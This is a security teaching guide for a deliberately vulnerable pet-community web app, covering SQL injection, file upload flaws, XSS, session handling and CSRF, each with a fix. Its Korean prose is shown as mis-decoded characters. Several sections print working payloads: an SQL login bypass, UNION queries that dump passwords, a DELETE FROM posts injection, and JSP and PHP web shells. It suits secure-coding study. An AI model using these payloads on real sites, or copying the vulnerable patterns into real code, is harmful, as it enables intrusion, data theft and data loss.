# ë°˜ë ¤ë™ë¬¼ ì»¤ë®¤ë‹ˆí‹° ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ ë³´ì•ˆ ì·¨ì•½ì  ë¶„ì„ ë° ëŒ€ì‘ ê°€ì´ë“œ

## ğŸ“‹ ê°œìš”
ì´ ë¬¸ì„œëŠ” êµìœ¡ ëª©ì ìœ¼ë¡œ ì œì‘ëœ ë°˜ë ¤ë™ë¬¼ ì»¤ë®¤ë‹ˆí‹° ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ë³´ì•ˆ ì·¨ì•½ì ê³¼ ëŒ€ì‘ ë°©ë²•ì„ ì„¤ëª…í•©ë‹ˆë‹¤.

---

## ğŸ”´ ì£¼ìš” ì·¨ì•½ì 

### 1. SQL Injection ì·¨ì•½ì 

#### ğŸ“ ìœ„ì¹˜
- `UserController.java` - ëª¨ë“  SQL ì¿¼ë¦¬
- `PostController.java` - ëª¨ë“  SQL ì¿¼ë¦¬ (ê²Œì‹œê¸€, ëŒ“ê¸€, ëŒ€ëŒ“ê¸€ í¬í•¨)

#### ğŸ” ì·¨ì•½í•œ ì½”ë“œ ì˜ˆì‹œ
```java
// ë¡œê·¸ì¸ ì¿¼ë¦¬ (UserController)
String sql = "SELECT * FROM users WHERE email = '" + email + "' AND password = '" + password + "'";

// ëŒ“ê¸€ ì‘ì„± ì¿¼ë¦¬ (PostController)
String sql = "INSERT INTO comments (content, post_id, user_id, created_at) " +
            "VALUES ('" + content + "', " + postId + ", " + user.getId() + ", NOW())";

// íšŒì› ê²€ìƒ‰ ì¿¼ë¦¬ (ê´€ë¦¬ì ê¸°ëŠ¥)
String sql = "SELECT * FROM users WHERE name LIKE '%" + search + "%' OR email LIKE '%" + search + "%'";
```

#### ğŸ’¥ ê³µê²© ì‹œë‚˜ë¦¬ì˜¤

**1) ë¡œê·¸ì¸ ìš°íšŒ**
```
ì´ë©”ì¼: admin@petcommunity.com' OR '1'='1' --
ë¹„ë°€ë²ˆí˜¸: ì•„ë¬´ê±°ë‚˜
```

**2) ëŒ“ê¸€ì„ í†µí•œ ë°ì´í„° ì¡°ì‘**
```
ëŒ“ê¸€ ë‚´ìš©: test'), (SELECT password FROM users WHERE id=1), 1, 1, NOW()); --
```

**3) ê´€ë¦¬ì ê²€ìƒ‰ì„ í†µí•œ ì •ë³´ íƒˆì·¨**
```
ê²€ìƒ‰ì–´: %' UNION SELECT id,password,email,role,NOW(),NOW() FROM users WHERE '1'='1
```

#### âœ… ìˆ˜ì • ë°©ë²•
```java
// PreparedStatement ì‚¬ìš©
String sql = "SELECT * FROM users WHERE email = ? AND password = ?";
PreparedStatement pstmt = conn.prepareStatement(sql);
pstmt.setString(1, email);
pstmt.setString(2, password);
ResultSet rs = pstmt.executeQuery();
```

---

### 2. íŒŒì¼ ì—…ë¡œë“œ ì·¨ì•½ì 

#### ğŸ“ ìœ„ì¹˜
- `PostController.createPost()` ë©”ì†Œë“œ
- `post_form.html` íŒŒì¼ ì—…ë¡œë“œ í¼

#### ğŸ” ì·¨ì•½í•œ ì„¤ì •
```java
// 1. íŒŒì¼ í™•ì¥ì ê²€ì¦ ì—†ìŒ
String originalFilename = file.getOriginalFilename();
String fileExtension = originalFilename.substring(originalFilename.lastIndexOf("."));

// 2. ì›¹ ì ‘ê·¼ ê°€ëŠ¥í•œ ê²½ë¡œì— ì €ì¥
private static final String UPLOAD_DIR = "src/main/resources/static/uploads/";

// 3. íŒŒì¼ í¬ê¸° ì œí•œì´ ë„ˆë¬´ í¼ (application.yml)
max-file-size: 100MB

// 4. ëª¨ë“  íŒŒì¼ íƒ€ì… í—ˆìš© (HTML)
<input type="file" name="image"> <!-- accept ì†ì„± ì—†ìŒ -->
```

#### ğŸ’¥ ê³µê²© ì‹œë‚˜ë¦¬ì˜¤

**1) ì›¹ì‰˜ ì—…ë¡œë“œ**
```
íŒŒì¼ëª…: shell.jsp
ë‚´ìš©:
<%
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
// ... ì›¹ì‰˜ ì½”ë“œ
%>
```

**2) PHP ì›¹ì‰˜ (Apache + PHP í™˜ê²½)**
```
íŒŒì¼ëª…: shell.php
ë‚´ìš©:
<?php
if(isset($_GET['cmd'])) {
    echo shell_exec($_GET['cmd']);
}
?>
```

**3) ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ ì—…ë¡œë“œ**
```
íŒŒì¼ëª…: malicious.js
ë‚´ìš©: ì•…ì„± JavaScript ì½”ë“œ
ì ‘ê·¼: http://localhost:8080/uploads/malicious.js
```

**4) MIME íƒ€ì… ìš°íšŒ**
- Content-Type í—¤ë” ì¡°ì‘
- ì´ì¤‘ í™•ì¥ì ì‚¬ìš© (file.jpg.php)
- Null byte ì‚½ì… (file.php%00.jpg)

#### âœ… ìˆ˜ì • ë°©ë²•

**1) í™•ì¥ì í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ ê²€ì¦**
```java
private static final Set<String> ALLOWED_EXTENSIONS = 
    Set.of(".jpg", ".jpeg", ".png", ".gif", ".pdf", ".txt");

public boolean isAllowedFile(String filename) {
    String extension = filename.toLowerCase()
        .substring(filename.lastIndexOf("."));
    return ALLOWED_EXTENSIONS.contains(extension);
}
```

**2) MIME íƒ€ì… ê²€ì¦**
```java
private static final Set<String> ALLOWED_MIME_TYPES = 
    Set.of("image/jpeg", "image/png", "image/gif", "application/pdf");

public boolean isValidMimeType(MultipartFile file) {
    return ALLOWED_MIME_TYPES.contains(file.getContentType());
}
```

**3) íŒŒì¼ ì €ì¥ ìœ„ì¹˜ ë³€ê²½**
```java
// ì›¹ ë£¨íŠ¸ ì™¸ë¶€ ë””ë ‰í† ë¦¬ ì‚¬ìš©
private static final String UPLOAD_DIR = "/var/uploads/petcommunity/";

// ë³„ë„ ë‹¤ìš´ë¡œë“œ ì»¨íŠ¸ë¡¤ëŸ¬ êµ¬í˜„
@GetMapping("/file/{filename}")
public ResponseEntity<Resource> downloadFile(@PathVariable String filename) {
    // íŒŒì¼ ê²€ì¦ í›„ ì•ˆì „í•˜ê²Œ ë‹¤ìš´ë¡œë“œ ì œê³µ
}
```

**4) íŒŒì¼ëª… ì™„ì „ ë³€ê²½**
```java
// ì›ë³¸ íŒŒì¼ëª… ì‚¬ìš© ê¸ˆì§€
String newFilename = UUID.randomUUID().toString();
// í™•ì¥ìë„ ë°ì´í„°ë² ì´ìŠ¤ì— ë³„ë„ ì €ì¥
```

---

### 3. ëŒ“ê¸€/ëŒ€ëŒ“ê¸€ ì‹œìŠ¤í…œì˜ ì¶”ê°€ ì·¨ì•½ì 

#### ğŸ” ìƒˆë¡œ ì¶”ê°€ëœ ê¸°ëŠ¥ì˜ ì·¨ì•½ì 

**1) ëŒ“ê¸€ ì‘ì„± SQL Injection**
```java
// ì·¨ì•½í•œ ì½”ë“œ
String sql = "INSERT INTO comments (content, post_id, user_id, parent_comment_id, created_at) " +
     "VALUES ('" + content + "', " + postId + ", " + user.getId() + 
     ", " + parentCommentId + ", NOW())";
```

**2) XSS ì·¨ì•½ì **
- ëŒ“ê¸€ ë‚´ìš©ì´ ê·¸ëŒ€ë¡œ ì¶œë ¥ë¨
- HTML íƒœê·¸ í•„í„°ë§ ì—†ìŒ

#### ğŸ’¥ ê³µê²© ì˜ˆì‹œ

**1) ëŒ“ê¸€ì„ í†µí•œ XSS**
```html
ëŒ“ê¸€ ë‚´ìš©: <script>alert('XSS')</script>
ë˜ëŠ”: <img src=x onerror=alert('XSS')>
```

**2) ëŒ“ê¸€ì„ í†µí•œ SQL Injection**
```
ëŒ“ê¸€ ë‚´ìš©: test'), (1, 1, 1, NULL, NOW()); DELETE FROM posts; --
```

#### âœ… ìˆ˜ì • ë°©ë²•

**1) XSS ë°©ì§€**
```java
// HTML ì´ìŠ¤ì¼€ì´í”„ ì²˜ë¦¬
public String escapeHtml(String input) {
    return input.replace("<", "&lt;")
               .replace(">", "&gt;")
               .replace("\"", "&quot;")
               .replace("'", "&#x27;");
}
```

**2) Thymeleaf ì„¤ì •**
```html
<!-- ìë™ ì´ìŠ¤ì¼€ì´í”„ -->
<p th:text="${comment.content}">ëŒ“ê¸€ ë‚´ìš©</p>
<!-- ìˆ˜ë™ ì´ìŠ¤ì¼€ì´í”„ í•´ì œ ê¸ˆì§€ -->
<!-- <p th:utext="${comment.content}">ëŒ“ê¸€ ë‚´ìš©</p> -->
```

---

### 4. ì„¸ì…˜ ê´€ë¦¬ ì·¨ì•½ì 

#### ğŸ” ë¬¸ì œì 
- ì„¸ì…˜ í•˜ì´ì¬í‚¹ ë°©ì§€ ë©”ì»¤ë‹ˆì¦˜ ì—†ìŒ
- ì„¸ì…˜ ë§Œë£Œ ì‹œê°„ ì„¤ì • ì—†ìŒ
- HTTPS ê°•ì œ ì„¤ì • ì—†ìŒ

#### âœ… ìˆ˜ì • ë°©ë²•
```yaml
# application.yml
server:
  servlet:
    session:
      timeout: 30m
      cookie:
        secure: true
        http-only: true
        same-site: strict
```

---

### 5. CSRF ì·¨ì•½ì 

#### ğŸ” ë¬¸ì œì 
- CSRF í† í° ì—†ìŒ
- ì¤‘ìš”í•œ ì‘ì—…ì— ëŒ€í•œ ì¶”ê°€ ì¸ì¦ ì—†ìŒ

#### âœ… ìˆ˜ì • ë°©ë²•
```html
<!-- CSRF í† í° ì¶”ê°€ -->
<form method="post" action="/posts">
    <input type="hidden" name="_token" th:value="${_csrf.token}">
    <!-- í¼ ë‚´ìš© -->
</form>
```

---

## ğŸ§ª ì·¨ì•½ì  í…ŒìŠ¤íŠ¸ ë°©ë²•

### SQL Injection í…ŒìŠ¤íŠ¸

**1) ë¡œê·¸ì¸ ìš°íšŒ í…ŒìŠ¤íŠ¸**
```
URL: http://localhost:8080/login
ì´ë©”ì¼: admin@petcommunity.com' OR '1'='1' --
ë¹„ë°€ë²ˆí˜¸: anything
```

**2) ê´€ë¦¬ì ê²€ìƒ‰ í…ŒìŠ¤íŠ¸**
```
URL: http://localhost:8080/admin/users?search=
ê²€ìƒ‰ì–´: %' UNION SELECT 1,password,email,role,NOW(),NOW() FROM users--
```

### íŒŒì¼ ì—…ë¡œë“œ í…ŒìŠ¤íŠ¸

**1) ì›¹ì‰˜ ì—…ë¡œë“œ í…ŒìŠ¤íŠ¸**
```
1. ê²Œì‹œê¸€ ì‘ì„± í˜ì´ì§€ ì ‘ì†
2. test.jsp íŒŒì¼ ì—…ë¡œë“œ
3. http://localhost:8080/uploads/UUID.jsp ì ‘ê·¼ ì‹œë„
```

**2) ìŠ¤í¬ë¦½íŠ¸ íŒŒì¼ ì—…ë¡œë“œ**
```
1. malicious.js íŒŒì¼ ì—…ë¡œë“œ
2. http://localhost:8080/uploads/UUID.js ì§ì ‘ ì ‘ê·¼
```

---

## ğŸ› ï¸ ì „ì²´ì ì¸ ë³´ì•ˆ ê°•í™” ë°©ì•ˆ

### 1. Spring Security ë„ì…
```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-security</artifactId>
</dependency>
```

### 2. ë°ì´í„°ë² ì´ìŠ¤ ì„¤ì •
```yaml
spring:
  datasource:
    url: jdbc:mysql://localhost:3306/pet_community?useSSL=true&requireSSL=true
  jpa:
    show-sql: false  # ìš´ì˜í™˜ê²½ì—ì„œëŠ” false
```

### 3. ë¡œê¹… ë° ëª¨ë‹ˆí„°ë§
```java
@Component
public class SecurityAuditLogger {
    public void logSuspiciousActivity(String activity, String userInfo) {
        logger.warn("Suspicious activity detected: {} from {}", activity, userInfo);
    }
}
```

### 4. ì…ë ¥ ê²€ì¦ ë° ì •ê·œí™”
```java
@Valid
public class PostRequest {
    @NotBlank
    @Size(max = 200)
    private String title;
    
    @NotBlank
    @Size(max = 5000)
    private String content;
}
```

---

## âš ï¸ ì£¼ì˜ì‚¬í•­

**ì´ ì• í”Œë¦¬ì¼€ì´ì…˜ì€ êµìœ¡ ëª©ì ìœ¼ë¡œë§Œ ì‚¬ìš©ë˜ì–´ì•¼ í•©ë‹ˆë‹¤.**

- ì‹¤ì œ ìš´ì˜ í™˜ê²½ì—ì„œ ì‚¬ìš© ê¸ˆì§€
- ì·¨ì•½ì  í…ŒìŠ¤íŠ¸ëŠ” í—ˆê°€ëœ í™˜ê²½ì—ì„œë§Œ ìˆ˜í–‰
- ì•…ì˜ì ì¸ ëª©ì ìœ¼ë¡œ ì‚¬ìš© ê¸ˆì§€
- í•™ìŠµ í›„ ë°˜ë“œì‹œ ë³´ì•ˆ ê°•í™” ë²„ì „ìœ¼ë¡œ ì¬êµ¬í˜„ ê¶Œì¥

---

## ğŸ“š ì°¸ê³  ìë£Œ

1. OWASP Top 10
2. Spring Security Documentation
3. SQL Injection Prevention Cheat Sheet
4. File Upload Security Guidelines
5. XSS Prevention Cheat Sheet

---

**ë¬¸ì„œ ë²„ì „:** 2.0  
**ìµœì¢… ì—…ë°ì´íŠ¸:** 2024ë…„ êµìœ¡ìš© ë²„ì „  
**ì‘ì„±ì:** ë³´ì•ˆ êµìœ¡íŒ€